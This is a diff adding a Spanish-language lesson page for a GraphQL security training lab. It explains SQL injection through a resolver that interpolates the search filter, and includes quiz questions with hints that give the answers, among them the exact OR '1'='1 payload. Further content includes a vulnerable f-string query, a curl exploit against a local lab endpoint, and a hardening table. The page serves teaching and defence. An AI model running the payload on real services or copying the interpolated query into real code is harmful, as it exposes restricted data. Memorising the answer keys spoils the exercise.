@@ -1,0 +1,49 @@
+---
+index: 2
+title: "Filter injection: el resolver que interpola"
+questions:
+  - id: graphql-security-t02-q01
+    prompt: "El campo search(q:) interpola el filtro. Haz colapsar el WHERE con un OR clásico y envía la flag del documento restringido."
+    hint: "{\"query\":\"{ search(q:\\\"' OR '1'='1\\\") { title class } }\"} — devuelve TODOS los documentos incluido el restricted"
+    kind: flag
+  - id: graphql-security-t02-q02
+    prompt: "¿Qué matriz de defensa de GraphQL valida el query contra un allowlist de operaciones antes de ejecutarlo (producción hardened)?"
+    hint: "Persisted queries / operation allowlisting: el servidor solo ejecuta queries pre-registradas"
+    kind: text
+---
+
+## El mismo SQLi de siempre, con syntax moderna
+
+El resolver del lab hace algo como:
+
+```python
+sql = f"SELECT * FROM documents WHERE title LIKE '%{q}%' AND class != 'restricted'"
+```
+
+La sintaxis GraphQL es nueva; la vulnerabilidad es la de los 90. Con la
+injection el `AND class != 'restricted'` se queda sin efecto:
+
+```bash
+curl -s http://127.0.0.1:18109/graphql \
+  -H 'Content-Type: application/json' \
+  -d '{"query": "{ search(q: \"'"'"' OR '"'"'1'"'"'='"'"'1\") { title class } }"}'
+```
+
+(con websocat-like quoting es lioso: en el panel del lab tienes el
+comando exacto copiable). El resultado: los tres documentos, incluido el
+postmortem restringido con la flag.
+
+## Cómo se endurece un GraphQL real
+
+| Capa | Medida |
+|---|---|
+| Schema | Introspection off, depth/complexity limits (anti-query-bomb) |
+| Queries | **Persisted queries**: solo se ejecutan operaciones pre-registradas por el frontend |
+| Resolvers | Autorización POR OBJETO en cada resolver (nunca "ya validó el endpoint") |
+| Inputs | Parámetros tipados + escape/ORM, igual que SQL clásico |
+| Rate limit | Query cost por usuario (una query anidada puede costar 1000 requests) |
+
+La lección transversal del room: GraphQL cambia el TRANSPORTE de las
+queries, no las reglas del juego. Todo lo que aprendiste de IDOR, inyección
+y autorización aplica igual — solo que ahora el atacante elige la forma
+exacta de la query, y tú tienes que validarla en el servidor.
